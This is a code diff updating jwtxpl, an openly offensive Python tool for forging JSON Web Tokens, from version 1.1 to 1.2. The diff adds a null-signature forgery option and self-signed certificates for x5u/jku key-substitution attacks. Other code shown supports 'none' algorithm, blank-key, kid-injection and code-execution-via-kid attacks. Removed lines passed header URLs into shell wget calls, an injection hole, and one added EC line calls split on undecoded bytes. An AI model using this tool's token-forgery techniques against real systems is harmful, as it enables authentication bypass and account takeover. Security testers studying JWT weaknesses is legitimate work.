@@ -19,20 +19,22 @@
 """
 
 
-__version__ = "1.1"
+__version__ = "1.2"
 __author__ = "DontPanicO"
 
 import os
 import sys
-import subprocess
+import socket
 import hmac
 import hashlib
 import base64
 import json
 import re
+import ssl
 import binascii
 import argparse
-import urllib.parse
+from urllib import request, parse, error
+from datetime import datetime, timedelta
 
 try:
     from cryptography.hazmat.primitives import hashes
@@ -40,7 +42,9 @@ try:
     from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
     from cryptography.hazmat.primitives.asymmetric.ec import EllipticCurvePublicNumbers
     from cryptography.hazmat.primitives.serialization import load_pem_public_key, load_pem_private_key, Encoding, PrivateFormat, PublicFormat, NoEncryption
-    from cryptography.x509 import load_pem_x509_certificate
+    from cryptography import x509
+    from cryptography.x509 import load_pem_x509_certificate, load_der_x509_certificate
+    from cryptography.x509.oid import NameOID
     from cryptography.hazmat.backends.openssl import backend
     from cryptography.hazmat.backends.openssl.rsa import _RSAPublicKey, _RSAPrivateKey
     from cryptography.hazmat.backends.openssl.ec import _EllipticCurvePublicKey, _EllipticCurvePrivateKey
@@ -85,7 +89,7 @@ class Cracker:
     def __init__(self, token, alg, path_to_key, user_payload, complex_payload, remove_from, add_into, auto_try, kid, exec_via_kid,
                  specified_key, jku_basic, jku_redirect, jku_header_injection, x5u_basic, x5u_header_injection, verify_token_with,
                  sub_time, add_time, find_key_from_jwks, unverified=False, blank=False, decode=False, manual=False,
-                 generate_jwk=False, dump_key=False):
+                 generate_jwk=False, dump_key=False, null_signature=False):
         """
         :param token: The user input token -> str
         :param alg: The algorithm for the attack. HS256 or None -> str
@@ -113,11 +117,11 @@ class Cracker:
         :param manual: A flag to set if the user need to craft an url manually -> Bool
         :param generate_jwk: A flag, if present a jwk will be generated and inserted in the token header -> Bool
         :param dump_key: A flag, if present the generated private key will be sotred in a file -> Bool
+        :param null_signature: A flag, if present no signature will be provided -> Bool
 
         Initialize the variables that we need to be able to access from all the class; all the params plus
         self.file and self.token. Then it call the validation method to validate some of these variables (see below),
         and lastly create a token dictionary, with dictionarize_token, and get decoded header and payload out of it.
-
         """
         print(Cracker.output)
         self.token = token
@@ -139,6 +143,7 @@ class Cracker:
         self.jku_header_injection = jku_header_injection
         self.x5u_basic = x5u_basic
         self.x5u_header_injection = x5u_header_injection
+        self.x5c = None
         self.verify_token_with = verify_token_with
         self.sub_time = sub_time
         self.add_time = add_time
@@ -149,8 +154,9 @@ class Cracker:
         self.manual = manual
         self.generate_jwk = generate_jwk
         self.dump_key = dump_key
+        self.null_signature = null_signature
         """Groups args based on requirements"""
-        self.no_key_validation_args = [self.verify_token_with, self.find_key_from_jwks, self.decode]
+        self.no_key_validation_args = [self.verify_token_with, self.find_key_from_jwks, self.decode, self.null_signature]
         self.jwks_args = [self.jku_basic, self.jku_redirect, self.jku_header_injection, self.x5u_basic, self.x5u_header_injection, self.generate_jwk]
         self.cant_asymmetric_args = [self.auto_try, self.kid, self.exec_via_kid, self.specified_key, self.blank]
         self.require_alg_args = [self.path_to_key] + self.cant_asymmetric_args + self.jwks_args
@@ -195,7 +201,6 @@ class Cracker:
         Same for self.exec_via_kid, where the key does not matter since the code will be executed before the token has been
         validated. If a key has been specified in self.specified_key stores it in self.key. Last, if self.path_to_key has a
         value, checks that the path exists and opens the file to read the key from.
-
         """
         """Validate the token"""
         token_is_valid = Cracker.check_token(self.token)
@@ -239,7 +244,7 @@ class Cracker:
                     sys.exit(2)
                 print(f"{Bcolors.OKBLUE}INFO: some JWT libraries use 'none' instead of 'None', make sure to try both.{Bcolors.ENDC}")
             elif self.alg.lower()[:2] in ["rs", "ps", "ec"]:
-                if not any(arg for arg in self.jwks_args + [self.path_to_key, self.verify_token_with, self.find_key_from_jwks, self.unverified]):
+                if not any(arg for arg in self.jwks_args + [self.path_to_key, self.verify_token_with, self.find_key_from_jwks, self.unverified, self.null_signature]):
                     print(f"{Bcolors.FAIL}jwtxpl: error: missing a valid key argument for EC/RSA{Bcolors.ENDC}")
                     sys.exit(4)
             if self.alg.lower() != "none":
@@ -263,8 +268,7 @@ class Cracker:
                     print(f"{Bcolors.FAIL}jwtxpl: error: too many key related arg {Bcolors.ENDC}")
                     sys.exit(2)
                 """No argument conflict"""
-                key_read_args = [self.path_to_key, self.x5u_basic, self.x5u_header_injection]
-                if not any(key_read_args):
+                if not self.path_to_key:
                     """No key file to read from"""
                     self.key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
                     if self.dump_key:
@@ -273,25 +277,6 @@ class Cracker:
                         print(f"{Bcolors.WARNING}jwtxpl: warn: you should use -D in order to dump the generated key into a file, so you can reuse it{Bcolors.ENDC}")
                 else:
                     """We have a key file to read from"""
-                    if self.path_to_key:
-                        if not os.path.exists(self.path_to_key):
-                            print(f"{Bcolors.FAIL}jwtxpl: error: no such file: {self.path_to_key}{Bcolors.ENDC}")
-                            sys.exit(7)
-                        if self.dump_key:
-                            print(f"{Bcolors.WARNING}jwtxpl: warn: key dumping will be ignored since you passed a key via -k/--key{Bcolors.ENDC}")
-                    if self.x5u_basic or self.x5u_header_injection:
-                        """Req a new cert and a new key file"""
-                        if not self.path_to_key:
-                            keyout = "jwtxpl_rsa_priv.pem" if self.dump_key else "key.pem"
-                            x5u_command = f'openssl req -newkey rsa:2048 -nodes -keyout {keyout} -x509 -days 365 -out testing.crt -subj "/CN=testing"'
-                            self.path_to_key = keyout
-                        else:
-                            x5u_command = f'openssl req -key {self.path_to_key} -x509 -days 365 -out testing.crt -subj "/CN=testing"'
-                        try:
-                            subprocess.run(x5u_command, shell=True, stdin=self.devnull, stderr=self.devnull, stdout=self.devnull, check=True)
-                        except subprocess.CalledProcessError:
-                            print(f"{Bcolors.FAIL}jwtxpl: error: error during cert request, please check your connection{Bcolors.FAIL}")
-                            sys.exit(7)
                     self.key = Cracker.read_pem_private_key(self.path_to_key)
                     if not isinstance(self.key, _RSAPrivateKey):
                         print(f"{Bcolors.FAIL}jwtxpl: error: alg/key mismatch. Key is not a private key or it's not RSA{Bcolors.ENDC}")
@@ -301,6 +286,11 @@ class Cracker:
                 """Extrac the n and the e"""
                 self.key.pub.e = self.key.pub.public_numbers().e
                 self.key.pub.n = self.key.pub.public_numbers().n
+                if any([self.x5u_basic, self.x5u_header_injection]):
+                    sign_hash = Cracker.get_sign_hash(self.alg)
+                    certificate_object = Cracker.gen_self_signed_certificate(self.key, self.key.pub, 30, sign_hash)
+                    certificate_object_content = certificate_object.public_bytes(Encoding.PEM).decode()
+                    self.x5c = "".join([line.strip() for line in certificate_object_content.split("\n") if not line.startswith("---")])
             elif self.alg[:2] == "ES":
                 """Check for key conflicts"""
                 if any(self.cant_asymmetric_args):
@@ -313,8 +303,7 @@ class Cracker:
                     print(f"{Bcolors.FAIL}jwtxpl: error: too many key related argument{Bcolors.ENDC}")
                     sys.exit(2)
                 """No argument conflict"""
-                read_key = [self.path_to_key, self.x5u_basic, self.x5u_header_injection]
-                if not any(read_key):
+                if not self.path_to_key:
                     """We have no key file to read from"""
                     ec_curve = Cracker.get_ec_curve(self.alg)
                     self.key = ec.generate_private_key(ec_curve)
@@ -324,30 +313,6 @@ class Cracker:
                         print(f"{Bcolors.WARNING}jwtxpl: warn: ou should use -D in order to dump the generated key into a file, so you can reuse it{Bcolors.ENDC}")
                 else:
                     """We have a key file to read from"""
-                    if self.path_to_key:
-                        if not os.path.exists(self.path_to_key):
-                            print(f"{Bcolors.FAIL}jwtxpl: error: no such file: {self.path_to_key}{Bcolors.ENDC}")
-                            sys.exit(7)
-                        if self.dump_key:
-                            print(f"{Bcolors.WARNING}jwtxpl: warn: key dumping will be ignored since you passed a key via -k/--key{Bcolors.ENDC}")
-                    if self.x5u_basic or self.x5u_header_injection:
-                        if not self.path_to_key:
-                            if self.alg[-3:] == "256":
-                                curve = "prime256v1"
-                            elif self.alg[-3:] == "384":
-                                curve = "secp384r1"
-                            elif self.alg[-3:] == "512":
-                                curve = "secp521r1"
-                            keyout = "jwtxpl_ec_priv.pem" if self.dump_key else "key.pem"
-                            x5u_command = f'openssl req -newkey ec -pkeyopt ec_paramgen_curve:{curve} -nodes -keyout {keyout} -x509 -days 365 -out testing.crt -subj "/CN=testing"'
-                            self.path_to_key = keyout
-                        else:
-                            x5u_command = f'openssl req -key {self.path_to_key} -x509 -days 365 -out testing.crt -subj "/CN=testing"'
-                        try:
-                            subprocess.run(x5u_command, shell=True, stdin=self.devnull, stderr=self.devnull, stdout=self.devnull, check=True)
-                        except subprocess.CalledProcessError:
-                            print(f"{Bcolors.FAIL}jwtxpl: error: error during cert request, please check your connection{Bcolors.ENDC}")
-                            sys.exit(7)
                     self.key = Cracker.read_pem_private_key(self.path_to_key)
                     if not isinstance(self.key, _EllipticCurvePrivateKey):
                         print(f"{Bcolors.FAIL}jwtxpl: error: alg/key mismatch. Key is not a private key or it's not EC{Bcolors.FAIL}")
@@ -356,6 +321,11 @@ class Cracker:
                 self.key.pub = self.key.public_key()
                 self.key.pub.x = self.key.pub.public_numbers().x
                 self.key.pub.y = self.key.pub.public_numbers().y
+                if any([self.x5u_basic, self.x5u_header_injection]):
+                    sign_hash = Cracker.get_sign_hash(self.alg)
+                    certificate_object = Cracker.gen_self_signed_certificate(self.key, self.key.pub, 30, sign_hash)
+                    certificate_object_content = certificate_object.public_bytes(Encoding.PEM)
+                    self.x5c = "".join([line.strip() for line in certificate_object_content.split("\n") if not line.startswith("---")])
             elif self.alg[:2] == "HS":
                 """Check for key conflicts"""
                 if any(self.jwks_args):
@@ -369,10 +339,9 @@ class Cracker:
                     sys.exit(2)
                 """No argument conflict"""
                 if self.dump_key:
-                    print(f"{Bcolors.WARNING}jwtxpl: error: no keys generated with HS*, dumping ignored{Bcolors.ENDC}")
+                    print(f"{Bcolors.WARNING}jwtxpl: warn: no keys generated with HS*, dumping ignored{Bcolors.ENDC}")
                 if self.auto_try is not None:
-                    path = Cracker.get_key_from_ssl_cert(self.auto_try)
-                    self.path_to_key = path
+                    self.key = Cracker.get_key_from_ssl_cert(self.auto_try)
                 elif self.kid is not None:
                     if self.kid.lower() == "dirtrv":
                         self.kid = "DirTrv"
@@ -408,7 +377,6 @@ class Cracker:
         them on the screen.
         This function is intended to run if -d (or --decode) is present so it prints outs some warnings if useless
         parameters have been called along with -d itself.
-
         """
         other_args = [
                       self.alg, self.path_to_key, self.user_payload, self.complex_payload,
@@ -514,7 +482,7 @@ class Cracker:
         sign_hash = Cracker.get_sign_hash(self.alg)
         index = Cracker.find_verifier_key_from_jwks(self.token, jwks_dict, sign_hash, jwa=self.alg)
         if index is None:
-            print(f"{Bcolors.OKBLUE}No keys from {self.find_key_from_jwk} can verify token signature{Bcolors.ENDC}")
+            print(f"{Bcolors.OKBLUE}No keys from {self.find_key_from_jwks} can verify token signature{Bcolors.ENDC}")
             sys.exit(0)
         try:
             result = json.dumps(jwks_dict['keys'][index], indent=2)
@@ -655,7 +623,7 @@ class Cracker:
                 numbers = [self.key.pub.n, self.key.pub.e]
             elif self.alg[:2] == "ES":
                 numbers = [self.key.pub.x, self.key.pub.y]
-            crafted_jwk = Cracker.generate_jwk(jwk_id, numbers, jwa=self.alg)
+            crafted_jwk = Cracker.gen_new_jwk(jwk_id, numbers, jwa=self.alg)
             header_dict = Cracker.embed_jwk_in_jwt_header(header_dict, crafted_jwk)
         if self.user_payload:
             for item in self.user_payload:
@@ -694,12 +662,9 @@ class Cracker:
         accesses it to change the modulus and the exponent with the ones of our generated key. Then creates a new
         file named jwks.json in the current working directory and writes the dump of the jwks dict into it.
         """
-        filename = "jwtxpl_jwks.json"
-        command = f"wget -O {filename} " + header['jku']
-        try:
-            command_output = subprocess.check_output(command, shell=True, stdin=self.devnull, stderr=self.devnull)
-        except subprocess.CalledProcessError:
-            print(f"{Bcolors.FAIL}jwtxpl: error: can't download jwks file from url specified in jku header{Bcolors.ENDC}")
+        filename = Cracker.download_jwks(header['jku'])
+        if filename is None:
+            print(f"{Bcolors.FAIL}jwtxpl: error: can't download jwks file from url specified in x5u header{Bcolors.ENDC}")
             sys.exit(1)
         with open(filename) as jwks_orig_file:
             jwks_dict = json.load(jwks_orig_file)
@@ -727,23 +692,21 @@ class Cracker:
             print(f"{Bcolors.FAIL}jwtxpl: error: non standard JWKS file{Bcolors.ENDC}")
             sys.exit(1)
         os.remove(filename)
-        with open("jwks.json", 'w'):
+        with open("jwks.json", 'w') as file:
             file.write(json.dumps(jwks_dict, indent=4))
 
     def jku_via_header_injection(self, header):
         """
         :param header: The header dictionary -> dict.
+
         Same as self.jku_basic_attack, but instead of write a jwks file, returns the content in an HTTP response body
         format.
 
         :return: The crafted jwks string in an HTTP response body format.
         """
-        filename = "jwtxpl_jwks.json"
-        command = f"wget -O {filename} " + header['jku']
-        try:
-            command_output = subprocess.check_output(command, shell=True, stdin=self.devnull, stderr=self.devnull)
-        except subprocess.CalledProcessError:
-            print(f"{Bcolors.FAIL}jwtxpl: error: can't download jwks file from url specified in jku header{Bcolors.ENDC}")
+        filename = Cracker.download_jwks(header['jku'])
+        if filename is None:
+            print(f"{Bcolors.FAIL}jwtxpl: error: can't download jwks file from url specified in x5u header{Bcolors.ENDC}")
             sys.exit(1)
         with open(filename) as jwks_orig_file:
             jwks_dict = json.load(jwks_orig_file)
@@ -782,15 +745,10 @@ class Cracker:
         access it and changes the x5c (the X509 cert) with our generated one. Then creates a file named jwks.json
         in the current working directory and write the dump of the jwks dict into it.
         """
-        filename = "jwtxpl_jwks.json"
-        command = f"wget -O {filename} " + header['x5u']
-        try:
-            command_output = subprocess.check_output(command, shell=True, stdin=self.devnull, stderr=self.devnull)
-        except subprocess.CalledProcessError:
+        filename = Cracker.download_jwks(header['x5u'])
+        if filename is None:
             print(f"{Bcolors.FAIL}jwtxpl: error: can't download jwks file from url specified in x5u header{Bcolors.ENDC}")
             sys.exit(1)
-        with open("testing.crt", 'r') as cert_file:
-            x5c_ = "".join([line.strip() for line in cert_file if not line.startswith('---')])
         with open(filename) as jwks_orig_file:
             jwks_dict = json.load(jwks_orig_file)
         if len(jwks_dict['keys']) == 1:
@@ -800,9 +758,9 @@ class Cracker:
             index = Cracker.find_verifier_key_from_jwks(self.token, jwks_dict, sign_hash, jwa=self.alg)
         try:
             if isinstance(jwks_dict['keys'][index]['x5c'], list):
-                jwks_dict['keys'][index]['x5c'].insert(0, x5c_)
+                jwks_dict['keys'][index]['x5c'].insert(0, self.x5c)
             else:
-                jwks_dict['keys'][index]['x5c'] = x5c_
+                jwks_dict['keys'][index]['x5c'] = self.x5c
             if self.alg[:2] in ["RS", "PS"]:
                 jwks_dict['keys'][index]['n'] = base64.urlsafe_b64encode(
                     self.key.pub.n.to_bytes(self.key.pub.n.bit_length() // 8 + 1, byteorder='big')
@@ -822,7 +780,7 @@ class Cracker:
             print(f"{Bcolors.FAIL}jwtxpl: error: non standard JWKS file{Bcolors.ENDC}")
             sys.exit(1)
         os.remove(filename)
-        with open("jwks.json", 'w'):
+        with open("jwks.json", 'w') as file:
             file.write(json.dumps(jwks_dict, indent=4))
 
     def x5u_via_header_injection(self, header):
@@ -834,15 +792,10 @@ class Cracker:
 
         :return: The crafted jwks string in an HTTP response body format.
         """
-        filename = "jwtxpl_jwks.json"
-        command = f"wget -O {filename} " + header['x5u']
-        try:
-            command_output = subprocess.check_output(command, shell=True, stdin=self.devnull, stderr=self.devnull)
-        except subprocess.CalledProcessError:
-            print(f"{Bcolors.FAIL}jwtxpl: error: can't download the jwks file from the url specified in x5u header{Bcolors.ENDC}")
+        filename = Cracker.download_jwks(header['x5u'])
+        if filename is None:
+            print(f"{Bcolors.FAIL}jwtxpl: error: can't download jwks file from url specified in x5u header{Bcolors.ENDC}")
             sys.exit(1)
-        with open("testing.crt", 'r') as cert_file:
-            x5c_ = "".join([line.strip() for line in cert_file if not line.startswith('---')])
         with open(filename) as jwks_orig_file:
             jwks_dict = json.load(jwks_orig_file)
         if len(jwks_dict['keys']) == 1:
@@ -852,9 +805,9 @@ class Cracker:
             index = Cracker.find_verifier_key_from_jwks(self.token, jwks_dict, sign_hash, jwa=self.alg)
         try:
             if isinstance(jwks_dict['keys'][index]['x5c'], list):
-                jwks_dict['keys'][index]['x5c'].insert(0, x5c_)
+                jwks_dict['keys'][index]['x5c'].insert(0,self.x5c)
             else:
-                jwks_dict['keys'][index]['x5c'] = x5c_
+                jwks_dict['keys'][index]['x5c'] = self.x5c
             if self.alg[:2] in ["RS", "PS"]:
                 jwks_dict['keys'][index]['n'] = base64.urlsafe_b64encode(
                     self.key.pub.n.to_bytes(self.key.pub.n.bit_length() // 8 + 1, byteorder='big')
@@ -890,7 +843,9 @@ class Cracker:
 
         :return: The generated signature.
         """
-        if self.unverified:
+        if self.null_signature:
+            signature = ""
+        elif self.unverified:
             signature = self.token_dict['signature']
         else:
             sign_hash = Cracker.get_sign_hash(self.alg)
@@ -926,12 +881,10 @@ class Cracker:
     def inject_kid(payload):
         """
         A function to test for injections in the kid header.
-
         :param payload: The payload to select -> str
 
         Defines a dictionary containing payloads to inject in the key header, and grabs the ones select by the user.
         This function is intended to be updated with new payloads.
-
         :return: The related payload string
 
         """
@@ -947,11 +900,9 @@ class Cracker:
     def check_token(token):
         """
         A method for verify if a JWT have a valid pattern.
-
         :param token: A JWT -> str.
 
         Creates a regex pattern and looks if the token match it.
-
         :return: True, if the token match the pattern, False if not.
         """
         token_pattern = r"^eyJ.+\.eyJ.+\..*$"
@@ -965,11 +916,9 @@ class Cracker:
     def dictionarize_token(token):
         """
         A method that stores in a dict the three part ok a JWT.
-
         :param token: A JWT -> str.
 
         Splits the token in three part (header, payload, signature) and creates a dict with thees data.
-
         :return: The created dict object
         """
         token_list = token.split(".")
@@ -982,14 +931,11 @@ class Cracker:
     def append_equals_if_needed(string):
         """
         Corrects a string that is intended to be base64 decoded.
-
         :param string: A string, base64 encoded part of a JWT -> str.
 
          Since JWT are base64 encoded but the equals signs are stripped, this function appends them to the
          string given as input, only if necessary.
-
          If the string can't be decoded after the second equal sign has been appended, it returns an error.
-
         :return: A byte-string ready to be base64 decoded.
         """
         encoded = string.encode()
@@ -1016,12 +962,11 @@ class Cracker:
 
         The function, given a string, replaces characters specified in the chars parameter with their url encoded one.
         By default, if the space character is not specified in the chars parameter, the function automatically appends it.
-
         :return: The original string with the specified characters url encoded
         """
         if " " not in chars and spaces:
             chars += " "
-        encoded = [urllib.parse.quote(char).lower() for char in chars]
+        encoded = [parse.quote(char).lower() for char in chars]
         for i in range(len(chars)):
             string = string.replace(chars[i], encoded[i])
         return string
@@ -1033,7 +978,6 @@ class Cracker:
 
         This function simply take the header and the payload from a dictionary created with dictionarize_token, passes
         them to append_equals_if_needed and decodes them.
-
         :return: The decoded header, and the decoded payload as strings.
         """
         if iterable['header'] is None or iterable['payload'] is None:
@@ -1057,7 +1001,6 @@ class Cracker:
 
         Given a string with this 'name:value' format, splits it, look for a <name> key in the iterable and, if it's,
         change its value to <value>. If it doesn't find <name> in the iterable's keys, print an error and quits out.
-
         :return: The dictionary with the changes done.
         """
         try:
@@ -1080,7 +1023,6 @@ class Cracker:
 
         The function first checks that the specified key exists in the dictionary, else returns an error and quits out.
         If the key exists, it delete the related item from the dictionary.
-
         :return: The modified dictionary
         """
         if key not in iterable.keys():
@@ -1097,7 +1039,6 @@ class Cracker:
 
         The function first check that the specified key does not already exists in the dictionary, else returns an error and
         quits out. If the key does not exists, it adds the new items with a default value.
-
         :return: The modified dictionary
         """
         if key in iterable.keys():
@@ -1112,7 +1053,6 @@ class Cracker:
         :param json_string. A json string representing the header or the payload -> str.
 
         Pretty self explanatory...
-
         :return: The base64 encoded string, so one part of the final token.
         """
         encoded_new_segment_bytes = base64.urlsafe_b64encode(json_string.encode("utf-8"))
@@ -1126,7 +1066,6 @@ class Cracker:
         :param payload_: The json string representing the payload -> str
 
         Calls encode_token_segment on header_ and payload_ and then sum them.
-
         :return: The encoded header + the encoded payload as string separated by a dot. The firsts two part of a JWT.
         """
         encoded_header = Cracker.encode_token_segment(header_)
@@ -1393,7 +1332,7 @@ class Cracker:
     @staticmethod
     def dump_pem_public_key(key, path):
         """
-        :param key: the private key object -> cryptography.hazmat.backends.openssl.ec._EllipticCurvePublicKey orcryptography.hazmat.backends.openssl.rsa._RSAPublicKey
+        :param key: the public key object -> cryptography.hazmat.backends.openssl.ec._EllipticCurvePublicKey orcryptography.hazmat.backends.openssl.rsa._RSAPublicKey
         :param path: the path to the file to dump into -> str
 
         Dumps key bytes into path
@@ -1403,6 +1342,55 @@ class Cracker:
         with open(path, 'wb') as keyfile:
             keyfile.write(key_bytes_data)
         return path
+
+    @staticmethod
+    def gen_self_signed_certificate(private_key, public_key, days, sign_hash):
+        """
+        :param private_key: the private key object -> cryptography.hazmat.backends.openssl.ec._EllipticCurvePrivateKey orcryptography.hazmat.backends.openssl.rsa._RSAPrivateKey
+        :param public_key: the public key object -> cryptography.hazmat.backends.openssl.ec._EllipticCurvePublicKey orcryptography.hazmat.backends.openssl.rsa._RSAPublicKey
+        :param days: days to certificate expiration -> int
+        :param sign_hash: the hash used for signing -> cryptography.hazmat.hashes
+
+        Generate a self signed certificate with dummy informations
+        :return: the certificate object
+        """
+        subject = issuer = x509.Name([
+            x509.NameAttribute(NameOID.ORGANIZATION_NAME, u"Testing Inc"),
+            x509.NameAttribute(NameOID.COMMON_NAME, u"Testing"),
+        ])
+        certificate = x509.CertificateBuilder().subject_name(
+            subject
+        ).issuer_name(
+            issuer
+        ).public_key(
+            public_key
+        ).serial_number(
+            x509.random_serial_number()
+        ).not_valid_before(
+            datetime.utcnow()
+        ).not_valid_after(
+            datetime.utcnow() + timedelta(days=days)
+        ).add_extension(
+            x509.SubjectAlternativeName([x509.DNSName(u"test")]),
+            critical=False
+        ).sign(private_key, sign_hash)
+        return certificate
+
+    @staticmethod
+    def download_jwks(url, filename="jwtxpl_jwks.json"):
+        """
+        :param url: the url to the jwks file -> str
+        :param filename: the filename to issue to the downloaded file -> str
+
+        :return: the path to the jwks file
+        """
+        try:
+            request.urlretrieve(url, filename)
+        except (error.HTTPError, error.URLError):
+            return None
+        except ValueError:
+            return None
+        return filename
 
     @staticmethod
     def gen_rsa_public_key_from_jwk(jwk):
@@ -1514,7 +1502,6 @@ class Cracker:
 
         The function first check for the separator, and quits out if is not present. Then split the string and check for
         integers ones.
-
         :return: The list of keys, or None if separator is not present in string
         """
         if "," not in string:
@@ -1538,7 +1525,6 @@ class Cracker:
 
         If at least one comma is present in the string, the function splits it by commas. Then it checks in the returned
         list, if any empty string exists and, case it is, deletes them. If any value is "null" it convert it in None.
-
         :return: The values list, if string contained values comma separated, else the string itself or None if the string
         was "null".
         """
@@ -1576,7 +1562,6 @@ class Cracker:
         If keys is a string, the script issues vals as it values in iterable. Else, if it's a list, it iterates
         trough the keys list building the path to iterable item to be changed. When the item has been accessed
         (the last iteration in the keys list), it assign it the value generated by build_vals
-
         :return: The modified payload dictionary
         """
         try:
@@ -1615,49 +1600,29 @@ class Cracker:
         return iterable
 
     @staticmethod
-    def get_key_from_ssl_cert(domain):
+    def get_key_from_ssl_cert(domain, port=443):
         """
-        :param domain: The domain name of which you want to retrieve the cert -> str
+        :param domain: the hostname of the server of which you want to retrieve the cert -> str
+        :param port: the port for connection -> int
 
-        First open devnull to redirect stdin, stdout or stderr if necessary, and defines a regex pattern to match the output of
-        our first command. Then defines the command that we need to retrieve an ssl cert, launches it with subprocess and handle
-        enventual errors. At this points, the function uses regex to grab the content that wee need, and writes that content in a
-        file (cert.pem). Then defines the second command, and launches it. Since this command should have no output, if we have,
-        breaks out and returns an error. Else stores the path for the generated key, and closes devnull.
-
-        :retrun the path to the generated key.
+        Connect to the target ssl connection to retrieve the certificate. Then extract the public
+        key object.
+        :retrun: the decoded public bytes of the public key object. 
         """
-        devnull_ = open(os.devnull, 'wb')
-        pattern = r'(?:Server\scertificate\s)((.|\n)*?)subject='
-        """Get cert.pem"""
-        first_command = f"openssl s_client -connect {domain}:443"
         try:
-            first_command_output = subprocess.check_output(
-                first_command, shell=True, stdin=devnull_, stderr=devnull_
-            ).decode('utf-8')
-        except subprocess.CalledProcessError:
-            print(
-                f"{Bcolors.FAIL}jwtxpl: error: openssl s_client can't connect with {domain}. Please make sure to type correctly{Bcolors.ENDC}"
-            )
+            pem_data = ssl.get_server_certificate((domain, port)).encode()
+        except socket.gaierror:
+            print(f"{Bcolors.FAIL}jwtxpl: error: host {domain} not known (check you connection){Bcolors.ENDC}")
             sys.exit(21)
-        cert = re.findall(pattern, first_command_output)[0][0].rstrip("\n")
-        """Write cert.pem"""
-        with open("cert.pem", 'w') as file:
-            file.write(cert)
-        """Extract key.pem"""
-        second_command = "openssl x509 -in cert.pem -pubkey -noout > key.pem"
-        second_command_output = subprocess.check_output(
-            second_command, shell=True, stdin=devnull_, stderr=subprocess.STDOUT
-        )
-        if second_command_output:
-            print(f"{Bcolors.FAIL}jwtxpl: error: cert seems to be invalid{Bcolors.ENDC}")
-            sys.exit(21)
-        key = f"{os.getcwd()}/key.pem"
-        devnull_.close()
-        return key
+        except ConnectionRefusedError:
+            print(f"{Bcolors.FAIL}jwtxpl: error: connection refused by {domain}{Bcolors.ENDC}")
+            sys.exit(1)
+        cert = load_pem_x509_certificate(pem_data)
+        public_key = cert.public_key()
+        return public_key.public_bytes(Encoding.PEM, PublicFormat.SubjectPublicKeyInfo).decode()
 
     @staticmethod
-    def generate_jwk(kid, public_numbers, jwa="RS256"):
+    def gen_new_jwk(kid, public_numbers, jwa="RS256"):
         """
         Generation of a jwk claim
         :param kid: The key identifier -> str
@@ -1730,12 +1695,6 @@ class Cracker:
         print(f"{Bcolors.BOLD}{Bcolors.HEADER}Final Token:{Bcolors.ENDC} {Bcolors.BOLD}{Bcolors.OKBLUE}{final_token}{Bcolors.ENDC}")
         if self.file is not None:
             self.file.close()
-        if os.path.exists("key.pem"):
-            os.remove("key.pem")
-        if os.path.exists("cert.pem"):
-            os.remove("cert.pem")
-        if os.path.exists("testing.crt"):
-            os.remove("testing.crt")
         self.devnull.close()
         sys.exit(0)
 
@@ -1777,6 +1736,10 @@ if __name__ == '__main__':
                         )
     parser.add_argument("-b", "--blank", action="store_true",
                         help="Set key as a blank string. Only with HS256",
+                        required=False
+                        )
+    parser.add_argument("-n", "--null-signature", action="store_true",
+                        help="Generate token without signature. e.g. HEADER.PAYLOAD.SIGNATURE become HEADER.PAYLOAD.",
                         required=False
                         )
     parser.add_argument("-t", "--subtract-time",
@@ -1868,7 +1831,7 @@ if __name__ == '__main__':
         args.token, args.alg, args.key, args.payload, args.complex_payload, args.remove_from, args.add_into, args.auto_try, args.inject_kid,
         args.exec_via_kid, args.specify_key, args.jku_basic, args.jku_redirect, args.jku_inbody, args.x5u_basic, args.x5u_inbody,
         args.verify_token_with, args.subtract_time, args.add_time, args.find_key_from_jwks, args.unverified, args.blank, args.decode,
-        args.manual, args.generate_jwk, args.dump_key
+        args.manual, args.generate_jwk, args.dump_key, args.null_signature
     )
 
     # Start the cracker
